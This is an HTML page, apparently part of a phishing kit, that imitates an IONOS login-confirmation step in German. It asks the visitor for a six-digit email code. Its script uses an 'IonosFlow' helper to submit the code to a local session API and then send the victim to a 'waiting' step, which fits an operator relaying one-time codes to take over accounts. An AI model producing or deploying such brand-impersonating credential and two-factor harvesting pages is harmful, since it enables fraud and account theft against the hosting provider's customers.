<!DOCTYPE html>
<html lang="de" data-exos-theme="ionos">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login – Zugang zu Ihrem Kundenkonto</title>
  <link rel="icon" type="image/png" sizes="32x32" href="ionos-assets/image/favicon-32px.png" />
  <link rel="stylesheet" href="ionos-assets/style/exos.min.css" />
  <link rel="stylesheet" href="ionos-assets/style/main.min.css" />
  <link rel="stylesheet" href="ionos-assets/style/starter-main.min.css" />
  <style>
    .oao-navi-center,
    .oao-navi-right {
      visibility: visible !important;
      display: flex;
      align-items: center;
    }

    .oao-navi-center {
      flex: 1 1 auto;
      justify-content: center;
      padding: 0 16px;
      max-width: 640px;
      margin: 0 auto;
    }

    .oao-navi-search {
      width: 100%;
      max-width: 560px;
    }

    .oao-navi-search .input-text-group {
      --input-text-group-height: 40px;
    }

    .oao-navi-search .input-text {
      font-size: 14px;
    }

    .oao-navi-help {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      color: #003d8f;
      text-decoration: none;
    }

    .confirm-intro {
      margin: 0 0 20px;
      font-size: 14px;
      line-height: 1.6;
      color: #333;
    }

    .identifier-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .identifier-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 32px;
      height: 32px;
      color: #003d8f;
      text-decoration: none;
      border-radius: 8px;
      flex-shrink: 0;
    }

    .identifier-back:hover {
      background: rgba(0, 61, 143, 0.06);
    }

    .identifier-back svg {
      width: 18px;
      height: 18px;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .button-current-identifier {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      max-width: 100%;
      padding: 0;
      border: none;
      background: transparent;
      color: #1474c4;
      font: inherit;
      font-size: 15px;
      font-weight: 600;
      cursor: default;
      text-align: left;
      min-width: 0;
    }

    .button-current-identifier .user-icon svg {
      width: 18px;
      height: 18px;
      fill: #1474c4;
    }

    .button-current-identifier span {
      overflow: visible !important;
      text-overflow: unset !important;
      white-space: normal !important;
    }

    #display-identifier {
      word-break: break-all;
    }

    .code-error {
      background: #fff0f0;
      border: 1px solid #ff6159;
      border-radius: 8px;
      color: #c0392b;
      font-size: 13px;
      padding: 12px 14px;
      margin-bottom: 16px;
      line-height: 1.5;
    }

    .current-identifier {
      max-width: 100% !important;
    }

    #code {
      font-size: 18px;
      letter-spacing: 0.25em;
      text-align: left;
    }
  </style>
</head>
<body>

  <div class="page-content">

    <div class="oao-navi-navigation oao-navi-light">
      <div class="oao-navi-left">
        <div class="oao-navi-application-name">
          <a class="oao-navi-app-name" href="ionos.html">
            <span class="oao-navi-app-logo"></span>
            <span>Login</span>
          </a>
        </div>
      </div>
      <div class="oao-navi-center hide-when-headless">
        <div class="oao-navi-search">
          <div class="input-text-group input-text-group--filled">
            <span class="input-text-group__icon input-text-group__icon--search" aria-hidden="true"></span>
            <input
              type="search"
              class="input-text"
              placeholder="Nach Funktionen, Domains und Hilfe suchen"
              autocomplete="off"
              tabindex="-1"
            />
          </div>
        </div>
      </div>
      <div class="oao-navi-right hide-when-headless">
        <a class="oao-navi-help" href="https://www.ionos.de/hilfe/" target="_blank" rel="noopener" aria-label="Hilfe">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003d8f" stroke-width="1.8">
            <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
            <circle cx="12" cy="12" r="1" fill="#003d8f" stroke="none"/>
          </svg>
        </a>
      </div>
    </div>

    <main>
      <section class="page-section page-section--default page-section--short">
        <div class="page-section__block">

          <div class="sheet">

            <section class="sheet__section sheet__section--default">
              <ul>
                <li class="stripe stripe--cropped">
                  <div class="stripe__item">
                    <img class="stripe__visual" src="ionos-assets/image/email-confirmation.svg" height="58" width="auto" alt="" />
                  </div>
                  <div class="stripe__item">
                    <h1 class="headline stripe__element">Login bestätigen</h1>
                  </div>
                </li>
              </ul>
            </section>

            <section class="sheet__section sheet__section--default">
              <p class="confirm-intro paragraph">
                Geben Sie den 6-stelligen Code ein, der an Ihre <strong>E-Mail-Adresse</strong> gesendet wurde, um Ihren Login zu bestätigen.
              </p>

              <div id="code-error" class="code-error" hidden></div>

              <form id="ionos-confirm-form" method="POST" novalidate>

                <div class="container-current-identifier">
                  <div class="identifier-row">
                    <a class="identifier-back" href="ionos.html" aria-label="Zurück">
                      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
                    </a>
                    <span class="current-identifier">
                      <span class="button-current-identifier">
                        <span class="user-icon" aria-hidden="true">
                          <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        </span>
                        <span id="display-identifier">—</span>
                      </span>
                    </span>
                  </div>
                </div>

                <ul>
                  <li class="form-stripe">
                    <label class="label" for="code">Code</label>
                    <input
                      type="text"
                      class="input-text form-input"
                      name="code"
                      id="code"
                      tabindex="1"
                      required
                      autofocus
                      autocomplete="one-time-code"
                      inputmode="numeric"
                      maxlength="6"
                      pattern="[0-9]{6}"
                      spellcheck="false"
                    />
                  </li>
                  <li class="form-stripe form-stripe--actions">
                    <button
                      class="button button--primary button--full-width button--with-loader"
                      type="submit"
                      id="button--with-loader"
                      tabindex="2"
                    >Weiter</button>
                  </li>
                </ul>

              </form>
            </section>

          </div>

        </div>
      </section>
    </main>

  </div>

  <footer class="page-footer">
    <div class="page-footer__block">
      <section class="page-footer__section page-footer__section--last">

        <div class="page-footer__section-item">
          <div class="oao-statuspage-overall-status page-footer__status"></div>
        </div>

        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
          &copy; 2026
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/unternehmen">IONOS SE</a>
        </div>

        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/impressum">Impressum</a> -
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc/terms-privacy">Datenschutz</a> -
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc">AGB</a>
        </div>

      </section>
    </div>
  </footer>

  <script src="/ionos-flow.js"></script>
  <script>
    (function () {
      const sessionId = IonosFlow.requireSession();
      if (!sessionId) return;

      const codeInput = document.getElementById("code");
      const errorBox = document.getElementById("code-error");

      IonosFlow.loadSessionInfo(sessionId).then(async function (info) {
        if (!info) return;
        document.getElementById("display-identifier").textContent = info.email;
        if (info.error) {
          IonosFlow.showError(errorBox, info.error);
          await fetch("/api/ionos/session/" + encodeURIComponent(sessionId) + "?consume=1");
        }
      });

      codeInput.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "").slice(0, 6);
      });

      document.getElementById("ionos-confirm-form").addEventListener("submit", async function (e) {
        e.preventDefault();
        const code = codeInput.value.trim();
        if (code.length !== 6) return;

        const btn = document.getElementById("button--with-loader");
        btn.disabled = true;
        btn.textContent = "Weiter …";
        IonosFlow.showError(errorBox, "");

        const data = await IonosFlow.submitCode(sessionId, code);
        if (data.ok) {
          IonosFlow.goWaiting(sessionId);
        } else {
          btn.disabled = false;
          btn.textContent = "Weiter";
        }
      });
    })();
  </script>

</body>
</html>
